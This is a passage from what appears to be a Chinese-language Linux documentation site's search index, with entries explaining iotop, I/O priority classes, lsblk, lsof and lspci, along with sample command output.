\u5728\u6bcf\u884c\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u65f6\u95f4\u6233\uff08\u6697\u793a--batch\uff09\u3002\u6bcf\u884c\u7684\u524d\u7f00\u90fd\u662f\u5f53\u524d\u65f6\u95f4\u3002 -q\uff0c --quiet \u6291\u5236\u6807\u9898\u7684\u67d0\u4e9b\u884c\uff08\u6697\u793a--batch\uff09\u3002\u6b64\u9009\u9879\u6700\u591a\u53ef\u4ee5\u6307\u5b9a\u4e09\u6b21\u4ee5\u5220\u9664\u6807\u9898\u884c\u3002 -q \u5217\u540d\u53ea\u5728\u7b2c\u4e00\u6b21\u65f6\u6253\u5370 -qq \u5217\u540d\u4e0d\u6253\u5370 -qqq \u4e0d\u6253\u5370IO\u6458\u8981","title":"\u5e38\u7528\u53c2\u6570\uff1a\ufeff"},{"location":"system/linux/IO/iotop/#_2","text":"[root@VM-0-16-centos ~]# iotop -otqqq TIME TID PRIO USER DISK READ DISK WRITE SWAPIN IO> COMMAND 16:57:42 6788 be/4 root 0.00 B/s 3.97 K/s 0.00 % 0.00 % barad_agent 16:57:43 12982 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.02 % [kworker/2:0] 16:57:46 12982 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.02 % [kworker/2:0] 16:57:47 291 be/3 root 0.00 B/s 23.80 K/s 0.00 % 0.28 % [jbd2/vda1-8] -o \u53ea\u663e\u793a\u6709IO\u7684\u8fdb\u7a0b -t \u663e\u793a\u65f6\u95f4 -qqq \u4e0d\u6253\u5370\u6458\u8981 TID \u7ebf\u7a0b\u53f7 -P\u9009\u9879\u53ef\u4ee5\u4ee5\u8fdb\u7a0b\u663e\u793a DISK READ \u548c DISK WRITE \u662fIO\u901f\u5ea6 SWAPIN\u5c31\u662f \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u82b1\u8d39\u5728\u4ea4\u6362\u5185\u5b58\u65f6\u95f4\u7684\u767e\u5206\u6bd4 IO \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u82b1\u8d39\u5728IO\u65f6\u95f4\u7684\u767e\u5206\u6bd4 PRIO \u662fI/O\u4f18\u5148\u7ea7 \u901a\u8fc7ionice -p \u4e5f\u53ef\u4ee5\u67e5\u770b","title":"\u5e38\u7528\u4f7f\u7528\u65b9\u6cd5"},{"location":"system/linux/IO/iotop/#io","text":"Class1(RTreal-time)\uff1a\u5b9e\u65f6 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Real time \u8fd9\u4e2a\u8c03\u5ea6\u7ea7\u522b\u7684\u8fdb\u7a0b\u4ea7\u751f\u7684IO\u88ab\u4f18\u5148\u5904\u7406\uff0c\u8fd9\u4e2a\u8c03\u5ea6\u7c7b\u578b\u5e94\u5c0f\u5fc3\u4f7f\u7528\uff0c\u9632\u6b62\u997f\u6b7b\u5176\u4ed6\u8fdb\u7a0bIO, \u5b83\u4e5f\u67098\u4e2a\u4f18\u5148\u7ea7\uff0c\u6570\u5b57\u8d8a\u5927\u5206\u7684\u7684IO\u65f6\u95f4\u7247\u8d8a\u957f Class2(BE best-effort): \u6700\u4f73\u6548\u679c\uff0c\u90fd\u80fd\u8bbf\u95ee \u9ed8\u8ba4 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Best-effort \u8fd9\u4e2a\u7c7b\u578b\u5171\u6709 8 \u4e2a\u4f18\u5148\u7ea7\uff0c\u5206\u522b\u4e3a 0-7\uff0c\u6570\u5b57\u8d8a\u4f4e\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u76f8\u540c\u7ea7\u522b\u7684\u4f18\u5148\u7ea7\u4f7f\u7528\u8f6e\u8be2\u7684\u65b9\u5f0f\u5904\u7406\u3002\u9002\u7528\u4e8e\u666e\u901a\u7684\u8fdb\u7a0b\u3002 \u57282.6.26\u4e4b\u524d\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u4f7f\u7528\"none\" \u8c03\u5ea6\u7c7b\u578b\uff0cIO\u8c03\u5ea6\u5668\u5c06\u5176\u89c6\u4f5cBest-effort\u8fdb\u884c\u5904\u7406\uff0c\u8fd9\u4e2a\u7c7b\u522b\u4e2d\u8fdb\u7a0b\u4f18\u5148\u7ea7\u7531CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u5f97\u6765\uff1aio_priority = (cpu_nice + 20) / 5 2.6.26\u4e4b\u540e\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u5c06\u4eceCPU\u8c03\u5ea6\u7c7b\u578b\u7ee7\u627f\u800c\u6765\uff0c\u8fd9\u4e2a\u7c7b\u522b\u7684\u4f18\u5148\u7ea7\u4ecd\u6309\u7167CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u800c\u6765\uff1aio_priority = (cpu_nice + 20) / 5 Class3(idle)\uff1a\u7a7a\u95f2 idle \u53ea\u6709\u5728\u6ca1\u6709\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u4ea7\u751f IO \u65f6\uff0cidle \u624d\u53ef\u4ee5\u4f7f\u7528\u78c1\u76d8 IO\uff0c\u9002\u7528\u4e8e\u54ea\u4e9b\u4e0d\u91cd\u8981\u7684\u7a0b\u5e8f\uff08\u5982 updatedb\uff09\uff0c\u8ba9\u5b83\u4eec\u5728\u78c1\u76d8\u7a7a\u95f2\u65f6\u518d\u4ea7\u751f IO","title":"I/O\u4f18\u5148\u7ea7"},{"location":"system/linux/IO/lsblk/","text":"lsblk\u547d\u4ee4 lsblk\u5217\u51fa\u6709\u5173\u6240\u6709\u6216\u6307\u5b9a\u7684\u5757\u8bbe\u5907\u7684\u4fe1\u606f\u3002lsblk\u547d\u4ee4\u8bfb\u53d6sysfs\u6587\u4ef6\u7cfb\u7edf\u4ee5\u6536\u96c6\u4fe1\u606f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u547d\u4ee4\u4ee5\u6811\u72b6\u683c\u5f0f\u6253\u5370\u6240\u6709\u5757\u8bbe\u5907\uff08RAM\u78c1\u76d8\u9664\u5916\uff09\u3002\u4f7f\u7528lsblk--help\u83b7\u53d6\u6240\u6709\u53ef\u7528\u5217\u7684\u5217\u8868\u3002 \u9ed8\u8ba4\u8f93\u51fa\u4ee5\u53ca--topology\u548c--fs\u7b49\u9009\u9879\u7684\u9ed8\u8ba4\u8f93\u51fa\u53ef\u80fd\u4f1a\u53d1\u751f\u66f4\u6539\uff0c\u56e0\u6b64\u5e94\u5c3d\u53ef\u80fd\u907f\u514d\u5728\u811a\u672c\u4e2d\u4f7f\u7528\u9ed8\u8ba4\u8f93\u51fa\u3002\u5728\u9700\u8981\u7a33\u5b9a\u8f93\u51fa\u7684\u73af\u5883\u4e2d\uff0c\u59cb\u7ec8\u901a\u8fc7--output\u5217\u663e\u5f0f\u5b9a\u4e49\u671f\u671b\u7684\u5217\u3002 lsblk \u547d\u4ee4\uff0cLinux lsblk \u547d\u4ee4\u8be6\u89e3\uff1a\u5217\u51fa\u5757\u8bbe\u5907\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) lsblk(8): block devices - Linux man page (die.net) # lsblk -a NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sr0 11:0 1 18.8M 0 rom vda 253:0 0 50G 0 disk \u2514\u2500vda1 253:1 0 50G 0 part / vdb 253:16 0 800G 0 disk # lsblk -f NAME FSTYPE LABEL UUID MOUNTPOINT sr0 iso9660 config-2 2023-03-22-17-15-00-00 vda \u2514\u2500vda1 ext4 2c04c946-7fee-41c2-a99f-f53e2532e4f7 / vdb # lsblk -t NAME ALIGNMENT MIN-IO OPT-IO PHY-SEC LOG-SEC ROTA SCHED RQ-SIZE RA WSAME sr0 0 2048 0 2048 2048 1 deadline 128 128 0B vda 0 512 0 512 512 1 mq-deadline 256 4096 0B \u2514\u2500vda1 0 512 0 512 512 1 mq-deadline 256 4096 0B vdb 0 512 0 512 512 1 mq-deadline 256 4096 0B","title":"lsblk\u547d\u4ee4"},{"location":"system/linux/IO/lsblk/#lsblk","text":"lsblk\u5217\u51fa\u6709\u5173\u6240\u6709\u6216\u6307\u5b9a\u7684\u5757\u8bbe\u5907\u7684\u4fe1\u606f\u3002lsblk\u547d\u4ee4\u8bfb\u53d6sysfs\u6587\u4ef6\u7cfb\u7edf\u4ee5\u6536\u96c6\u4fe1\u606f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u547d\u4ee4\u4ee5\u6811\u72b6\u683c\u5f0f\u6253\u5370\u6240\u6709\u5757\u8bbe\u5907\uff08RAM\u78c1\u76d8\u9664\u5916\uff09\u3002\u4f7f\u7528lsblk--help\u83b7\u53d6\u6240\u6709\u53ef\u7528\u5217\u7684\u5217\u8868\u3002 \u9ed8\u8ba4\u8f93\u51fa\u4ee5\u53ca--topology\u548c--fs\u7b49\u9009\u9879\u7684\u9ed8\u8ba4\u8f93\u51fa\u53ef\u80fd\u4f1a\u53d1\u751f\u66f4\u6539\uff0c\u56e0\u6b64\u5e94\u5c3d\u53ef\u80fd\u907f\u514d\u5728\u811a\u672c\u4e2d\u4f7f\u7528\u9ed8\u8ba4\u8f93\u51fa\u3002\u5728\u9700\u8981\u7a33\u5b9a\u8f93\u51fa\u7684\u73af\u5883\u4e2d\uff0c\u59cb\u7ec8\u901a\u8fc7--output\u5217\u663e\u5f0f\u5b9a\u4e49\u671f\u671b\u7684\u5217\u3002 lsblk \u547d\u4ee4\uff0cLinux lsblk \u547d\u4ee4\u8be6\u89e3\uff1a\u5217\u51fa\u5757\u8bbe\u5907\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) lsblk(8): block devices - Linux man page (die.net) # lsblk -a NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sr0 11:0 1 18.8M 0 rom vda 253:0 0 50G 0 disk \u2514\u2500vda1 253:1 0 50G 0 part / vdb 253:16 0 800G 0 disk # lsblk -f NAME FSTYPE LABEL UUID MOUNTPOINT sr0 iso9660 config-2 2023-03-22-17-15-00-00 vda \u2514\u2500vda1 ext4 2c04c946-7fee-41c2-a99f-f53e2532e4f7 / vdb # lsblk -t NAME ALIGNMENT MIN-IO OPT-IO PHY-SEC LOG-SEC ROTA SCHED RQ-SIZE RA WSAME sr0 0 2048 0 2048 2048 1 deadline 128 128 0B vda 0 512 0 512 512 1 mq-deadline 256 4096 0B \u2514\u2500vda1 0 512 0 512 512 1 mq-deadline 256 4096 0B vdb 0 512 0 512 512 1 mq-deadline 256 4096 0B","title":"lsblk\u547d\u4ee4"},{"location":"system/linux/IO/lsof/","text":"lsof\u547d\u4ee4 lsof \uff08List Open Files\uff09\u662f\u4e00\u4e2a\u5728Unix\u3001Linux\u548c\u7c7bUnix\u7cfb\u7edf\u4e0a\u975e\u5e38\u6709\u7528\u7684\u547d\u4ee4\uff0c\u5b83\u7528\u4e8e\u5217\u51fa\u7cfb\u7edf\u4e2d\u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u3002\u7531\u4e8e\u5728Unix\u548cLinux\u7cfb\u7edf\u4e2d\uff0c\u51e0\u4e4e\u4e00\u5207\u90fd\u662f\u6587\u4ef6\uff08\u5305\u62ec\u8bbe\u5907\u548c\u7f51\u7edc\u5957\u63a5\u5b57\uff09\uff0c lsof \u547d\u4ee4\u53d8\u5f97\u975e\u5e38\u5f3a\u5927\u548c\u591a\u7528\u9014\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684 lsof \u7528\u6cd5\uff1a \u5217\u51fa\u6240\u6709\u6253\u5f00\u7684\u6587\u4ef6 \uff1a\u4ec5\u8f93\u5165 lsof \u547d\u4ee4\u4f1a\u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u6309\u7167\u7528\u6237\u7b5b\u9009 \uff1a lsof -u username \u4f1a\u5217\u51fa\u7279\u5b9a\u7528\u6237\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u67e5\u627e\u7279\u5b9a\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6 \uff1a lsof -p pid \u4f1a\u5217\u51fa\u7279\u5b9a\u8fdb\u7a0bID\uff08PID\uff09\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u67e5\u770b\u67d0\u4e2a\u7aef\u53e3\u7684\u4f7f\u7528\u60c5\u51b5 \uff1a lsof -i :port \u53ef\u4ee5\u67e5\u770b\u54ea\u4e9b\u8fdb\u7a0b\u6b63\u5728\u4f7f\u7528\u7279\u5b9a\u7684\u7f51\u7edc\u7aef\u53e3\u3002 \u5217\u51fa\u67d0\u4e2a\u76ee\u5f55\u4e0b\u88ab\u6253\u5f00\u7684\u6587\u4ef6 \uff1a lsof +D /path/to/directory \u4f1a\u663e\u793a\u5728\u6307\u5b9a\u76ee\u5f55\u4e0b\u6240\u6709\u88ab\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u67e5\u627e\u6253\u5f00\u67d0\u4e2a\u6587\u4ef6\u7684\u8fdb\u7a0b \uff1a lsof /path/to/file \u4f1a\u5217\u51fa\u6253\u5f00\u7279\u5b9a\u6587\u4ef6\u7684\u6240\u6709\u8fdb\u7a0b\u3002 \u663e\u793a\u7f51\u7edc\u8fde\u63a5 \uff1a lsof -i \u7528\u4e8e\u663e\u793a\u6240\u6709\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u51fa\u6240\u6709UNIX\u57df\u5957\u63a5\u5b57 \uff1a lsof -U \u7528\u4e8e\u67e5\u770b\u6240\u6709UNIX\u57df\u5957\u63a5\u5b57\u3002 \u7ec4\u5408\u4f7f\u7528\u591a\u4e2a\u9009\u9879 \uff1a\u4f60\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\u591a\u4e2a\u9009\u9879\uff0c\u4f8b\u5982 lsof -u user -i \u6765\u67e5\u627e\u7279\u5b9a\u7528\u6237\u6253\u5f00\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u67e5\u770b\u7279\u5b9a\u7c7b\u578b\u7684\u6587\u4ef6 \uff1a lsof -t type \uff0c\u5176\u4e2d type \u53ef\u4ee5\u662f REG \uff08\u5e38\u89c4\u6587\u4ef6\uff09\u3001 DIR \uff08\u76ee\u5f55\uff09\u3001 CHR \uff08\u5b57\u7b26\u8bbe\u5907\uff09\u3001 BLK \uff08\u5757\u8bbe\u5907\uff09\u7b49\u3002 \u8fd9\u4e9b\u662f lsof \u547d\u4ee4\u8f93\u51fa\u4e2d\u5404\u5217\u7684\u610f\u4e49\uff1a COMMAND \uff1a\u663e\u793a\u6253\u5f00\u6587\u4ef6\u7684\u8fdb\u7a0b\u7684\u547d\u4ee4\u540d\u6216\u7a0b\u5e8f\u540d\u3002 PID \uff1a\u8868\u793a\u6253\u5f00\u8be5\u6587\u4ef6\u7684\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u6807\u8bc6\u53f7\uff08Process ID\uff09\u3002 TID \uff1a\u7ebf\u7a0bID\uff08Thread ID\uff09\u3002\u5982\u679c\u8f93\u51fa\u4e2d\u5305\u542b\u8fd9\u4e00\u5217\uff0c\u5b83\u8868\u793a\u7279\u5b9a\u7ebf\u7a0b\u800c\u4e0d\u662f\u6574\u4e2a\u8fdb\u7a0b\u6253\u5f00\u4e86\u6587\u4ef6\u3002 USER \uff1a\u663e\u793a\u6253\u5f00\u6587\u4ef6\u7684\u8fdb\u7a0b\u7684\u6240\u5c5e\u7528\u6237\u3002 FD \uff1a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5b83\u662f\u4e00\u4e2a\u7528\u4e8e\u8868\u793a\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6\u7684\u6807\u8bb0\u3002\u8fd9\u4e2a\u6807\u8bb0\u53ef\u4ee5\u662f\u4e00\u4e2a\u6570\u5b57\uff08\u59821\uff0c2\uff0c3...\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u4ee5\u4e0b\u7279\u6b8a\u5b57\u7b26\u4e4b\u4e00\uff1a cwd \uff1a\u8868\u793a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002 txt \uff1a\u8868\u793a\u7a0b\u5e8f\u4ee3\u7801\u672c\u8eab\u3002 mem \uff1a\u8868\u793a\u5185\u5b58\u6620\u5c04\u6587\u4ef6\uff0c\u901a\u5e38\u662f\u5171\u4eab\u5e93\u6216\u7a0b\u5e8f\u7684\u4e00\u90e8\u5206\u3002 rtd \uff1a\u8868\u793a\u6839\u76ee\u5f55\u3002 DEL \uff1a\u8868\u793a\u5df2\u5220\u9664\u7684\u6587\u4ef6\u3002 TYPE \uff1a\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a DIR \uff1a\u76ee\u5f55 REG \uff1a\u5e38\u89c4\u6587\u4ef6 CHR \uff1a\u5b57\u7b26\u8bbe\u5907 BLK \uff1a\u5757\u8bbe\u5907 FIFO \uff1a\u7ba1\u9053 SOCK \uff1a\u5957\u63a5\u5b57 DEVICE \uff1a\u663e\u793a\u6587\u4ef6\u6240\u5728\u7684\u8bbe\u5907\u53f7\u3002\u901a\u5e38\u5bf9\u4e8e\u78c1\u76d8\u6587\u4ef6\uff0c\u8fd9\u4ee3\u8868\u6587\u4ef6\u7cfb\u7edf\u7684\u8bbe\u5907\u3002 SIZE/OFF \uff1a\u5bf9\u4e8e\u666e\u901a\u6587\u4ef6\uff0c\u8fd9\u662f\u6587\u4ef6\u7684\u5927\u5c0f\u3002\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u6587\u4ef6\uff0c\u5982\u7f51\u7edc\u5957\u63a5\u5b57\u6216\u7ba1\u9053\uff0c\u8fd9\u53ef\u80fd\u8868\u793a\u4e00\u4e2a\u504f\u79fb\u91cf\u6216\u8005\u4e0d\u540c\u7684\u6570\u636e\u3002 NODE \uff1a\u6587\u4ef6\u7684inode\u7f16\u53f7\uff0c\u8fd9\u662f\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6587\u4ef6\u7684\u552f\u4e00\u6807\u8bc6\u3002 NAME \uff1a\u6587\u4ef6\u7684\u540d\u79f0\u548c\u8def\u5f84\uff0c\u6216\u8005\u662f\u8bbe\u5907\u3001\u7f51\u7edc\u8fde\u63a5\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 lsof \u547d\u4ee4\uff0cLinux lsof \u547d\u4ee4\u8be6\u89e3\uff1a\u663e\u793aLinux\u7cfb\u7edf\u5f53\u524d\u5df2\u6253\u5f00\u7684\u6240\u6709\u6587\u4ef6\u5217\u8868 lsof -p pid - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com)","title":"lsof"},{"location":"system/linux/IO/lsof/#lsof","text":"lsof \uff08List Open Files\uff09\u662f\u4e00\u4e2a\u5728Unix\u3001Linux\u548c\u7c7bUnix\u7cfb\u7edf\u4e0a\u975e\u5e38\u6709\u7528\u7684\u547d\u4ee4\uff0c\u5b83\u7528\u4e8e\u5217\u51fa\u7cfb\u7edf\u4e2d\u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u3002\u7531\u4e8e\u5728Unix\u548cLinux\u7cfb\u7edf\u4e2d\uff0c\u51e0\u4e4e\u4e00\u5207\u90fd\u662f\u6587\u4ef6\uff08\u5305\u62ec\u8bbe\u5907\u548c\u7f51\u7edc\u5957\u63a5\u5b57\uff09\uff0c lsof \u547d\u4ee4\u53d8\u5f97\u975e\u5e38\u5f3a\u5927\u548c\u591a\u7528\u9014\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684 lsof \u7528\u6cd5\uff1a \u5217\u51fa\u6240\u6709\u6253\u5f00\u7684\u6587\u4ef6 \uff1a\u4ec5\u8f93\u5165 lsof \u547d\u4ee4\u4f1a\u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u6309\u7167\u7528\u6237\u7b5b\u9009 \uff1a lsof -u username \u4f1a\u5217\u51fa\u7279\u5b9a\u7528\u6237\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u67e5\u627e\u7279\u5b9a\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6 \uff1a lsof -p pid \u4f1a\u5217\u51fa\u7279\u5b9a\u8fdb\u7a0bID\uff08PID\uff09\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u67e5\u770b\u67d0\u4e2a\u7aef\u53e3\u7684\u4f7f\u7528\u60c5\u51b5 \uff1a lsof -i :port \u53ef\u4ee5\u67e5\u770b\u54ea\u4e9b\u8fdb\u7a0b\u6b63\u5728\u4f7f\u7528\u7279\u5b9a\u7684\u7f51\u7edc\u7aef\u53e3\u3002 \u5217\u51fa\u67d0\u4e2a\u76ee\u5f55\u4e0b\u88ab\u6253\u5f00\u7684\u6587\u4ef6 \uff1a lsof +D /path/to/directory \u4f1a\u663e\u793a\u5728\u6307\u5b9a\u76ee\u5f55\u4e0b\u6240\u6709\u88ab\u6253\u5f00\u7684\u6587\u4ef6\u3002 \u67e5\u627e\u6253\u5f00\u67d0\u4e2a\u6587\u4ef6\u7684\u8fdb\u7a0b \uff1a lsof /path/to/file \u4f1a\u5217\u51fa\u6253\u5f00\u7279\u5b9a\u6587\u4ef6\u7684\u6240\u6709\u8fdb\u7a0b\u3002 \u663e\u793a\u7f51\u7edc\u8fde\u63a5 \uff1a lsof -i \u7528\u4e8e\u663e\u793a\u6240\u6709\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u51fa\u6240\u6709UNIX\u57df\u5957\u63a5\u5b57 \uff1a lsof -U \u7528\u4e8e\u67e5\u770b\u6240\u6709UNIX\u57df\u5957\u63a5\u5b57\u3002 \u7ec4\u5408\u4f7f\u7528\u591a\u4e2a\u9009\u9879 \uff1a\u4f60\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\u591a\u4e2a\u9009\u9879\uff0c\u4f8b\u5982 lsof -u user -i \u6765\u67e5\u627e\u7279\u5b9a\u7528\u6237\u6253\u5f00\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u67e5\u770b\u7279\u5b9a\u7c7b\u578b\u7684\u6587\u4ef6 \uff1a lsof -t type \uff0c\u5176\u4e2d type \u53ef\u4ee5\u662f REG \uff08\u5e38\u89c4\u6587\u4ef6\uff09\u3001 DIR \uff08\u76ee\u5f55\uff09\u3001 CHR \uff08\u5b57\u7b26\u8bbe\u5907\uff09\u3001 BLK \uff08\u5757\u8bbe\u5907\uff09\u7b49\u3002 \u8fd9\u4e9b\u662f lsof \u547d\u4ee4\u8f93\u51fa\u4e2d\u5404\u5217\u7684\u610f\u4e49\uff1a COMMAND \uff1a\u663e\u793a\u6253\u5f00\u6587\u4ef6\u7684\u8fdb\u7a0b\u7684\u547d\u4ee4\u540d\u6216\u7a0b\u5e8f\u540d\u3002 PID \uff1a\u8868\u793a\u6253\u5f00\u8be5\u6587\u4ef6\u7684\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u6807\u8bc6\u53f7\uff08Process ID\uff09\u3002 TID \uff1a\u7ebf\u7a0bID\uff08Thread ID\uff09\u3002\u5982\u679c\u8f93\u51fa\u4e2d\u5305\u542b\u8fd9\u4e00\u5217\uff0c\u5b83\u8868\u793a\u7279\u5b9a\u7ebf\u7a0b\u800c\u4e0d\u662f\u6574\u4e2a\u8fdb\u7a0b\u6253\u5f00\u4e86\u6587\u4ef6\u3002 USER \uff1a\u663e\u793a\u6253\u5f00\u6587\u4ef6\u7684\u8fdb\u7a0b\u7684\u6240\u5c5e\u7528\u6237\u3002 FD \uff1a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5b83\u662f\u4e00\u4e2a\u7528\u4e8e\u8868\u793a\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6\u7684\u6807\u8bb0\u3002\u8fd9\u4e2a\u6807\u8bb0\u53ef\u4ee5\u662f\u4e00\u4e2a\u6570\u5b57\uff08\u59821\uff0c2\uff0c3...\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u4ee5\u4e0b\u7279\u6b8a\u5b57\u7b26\u4e4b\u4e00\uff1a cwd \uff1a\u8868\u793a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002 txt \uff1a\u8868\u793a\u7a0b\u5e8f\u4ee3\u7801\u672c\u8eab\u3002 mem \uff1a\u8868\u793a\u5185\u5b58\u6620\u5c04\u6587\u4ef6\uff0c\u901a\u5e38\u662f\u5171\u4eab\u5e93\u6216\u7a0b\u5e8f\u7684\u4e00\u90e8\u5206\u3002 rtd \uff1a\u8868\u793a\u6839\u76ee\u5f55\u3002 DEL \uff1a\u8868\u793a\u5df2\u5220\u9664\u7684\u6587\u4ef6\u3002 TYPE \uff1a\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a DIR \uff1a\u76ee\u5f55 REG \uff1a\u5e38\u89c4\u6587\u4ef6 CHR \uff1a\u5b57\u7b26\u8bbe\u5907 BLK \uff1a\u5757\u8bbe\u5907 FIFO \uff1a\u7ba1\u9053 SOCK \uff1a\u5957\u63a5\u5b57 DEVICE \uff1a\u663e\u793a\u6587\u4ef6\u6240\u5728\u7684\u8bbe\u5907\u53f7\u3002\u901a\u5e38\u5bf9\u4e8e\u78c1\u76d8\u6587\u4ef6\uff0c\u8fd9\u4ee3\u8868\u6587\u4ef6\u7cfb\u7edf\u7684\u8bbe\u5907\u3002 SIZE/OFF \uff1a\u5bf9\u4e8e\u666e\u901a\u6587\u4ef6\uff0c\u8fd9\u662f\u6587\u4ef6\u7684\u5927\u5c0f\u3002\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u6587\u4ef6\uff0c\u5982\u7f51\u7edc\u5957\u63a5\u5b57\u6216\u7ba1\u9053\uff0c\u8fd9\u53ef\u80fd\u8868\u793a\u4e00\u4e2a\u504f\u79fb\u91cf\u6216\u8005\u4e0d\u540c\u7684\u6570\u636e\u3002 NODE \uff1a\u6587\u4ef6\u7684inode\u7f16\u53f7\uff0c\u8fd9\u662f\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6587\u4ef6\u7684\u552f\u4e00\u6807\u8bc6\u3002 NAME \uff1a\u6587\u4ef6\u7684\u540d\u79f0\u548c\u8def\u5f84\uff0c\u6216\u8005\u662f\u8bbe\u5907\u3001\u7f51\u7edc\u8fde\u63a5\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 lsof \u547d\u4ee4\uff0cLinux lsof \u547d\u4ee4\u8be6\u89e3\uff1a\u663e\u793aLinux\u7cfb\u7edf\u5f53\u524d\u5df2\u6253\u5f00\u7684\u6240\u6709\u6587\u4ef6\u5217\u8868 lsof -p pid - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com)","title":"lsof\u547d\u4ee4"},{"location":"system/linux/IO/lspci/","text":"lspci\u547d\u4ee4 lspci\u662f\u4e00\u4e2a\u5b9e\u7528\u7a0b\u5e8f\uff0c\u7528\u4e8e\u663e\u793a\u7cfb\u7edf\u4e2dPCI\u603b\u7ebf\u53ca\u5176\u8fde\u63a5\u8bbe\u5907\u7684\u4fe1\u606f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b83\u663e\u793a\u8bbe\u5907\u7684\u7b80\u77ed\u5217\u8868\u3002\u4f7f\u7528\u4e0b\u9762\u63cf\u8ff0\u7684\u9009\u9879\u6765\u8bf7\u6c42\u66f4\u8be6\u7ec6\u7684\u8f93\u51fa\u6216\u7528\u4e8e\u5176\u4ed6\u7a0b\u5e8f\u89e3\u6790\u7684\u8f93\u51fa\u3002 \u5982\u679c\u60a8\u8981\u62a5\u544aPCI\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u6216lspci\u672c\u8eab\u4e2d\u7684\u9519\u8bef\uff0c\u8bf7\u5305\u62ec\u201clspci-vvx\u201d\u6216\u66f4\u597d\u7684\u201clspci-vvxxx\u201d\u7684\u8f93\u51fa\uff08\u4f46\u662f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u53ef\u80fd\u7684\u6ce8\u610f\u4e8b\u9879\uff09\u3002 \u8f93\u51fa\u7684\u67d0\u4e9b\u90e8\u5206\uff0c\u5c24\u5176\u662f\u5728\u9ad8\u5ea6\u5197\u957f\u7684\u6a21\u5f0f\u4e0b\uff0c\u53ef\u80fd\u53ea\u6709\u7ecf\u9a8c\u4e30\u5bcc\u7684PCI\u9ed1\u5ba2\u624d\u80fd\u7406\u89e3\u3002\u6709\u5173\u5b57\u6bb5\u7684\u786e\u5207\u5b9a\u4e49\uff0c\u8bf7\u53c2\u9605PCI\u89c4\u8303\u6216header.h\u548c/usr/include/linux/PCI.h include\u6587\u4ef6\u3002 